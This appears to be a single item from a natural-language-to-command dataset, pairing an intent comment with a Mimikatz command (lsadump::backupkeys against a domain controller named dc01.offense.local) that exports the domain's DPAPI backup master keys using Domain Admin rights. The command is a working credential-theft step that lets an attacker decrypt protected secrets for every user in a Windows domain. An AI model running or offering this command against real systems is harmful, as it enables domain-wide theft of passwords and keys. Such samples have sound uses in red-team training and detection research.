# Natural language intent:
# Extract all backup Master Keys with Domain Admin A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:

lsadump::backupkeys /system:dc01.offense.local /export
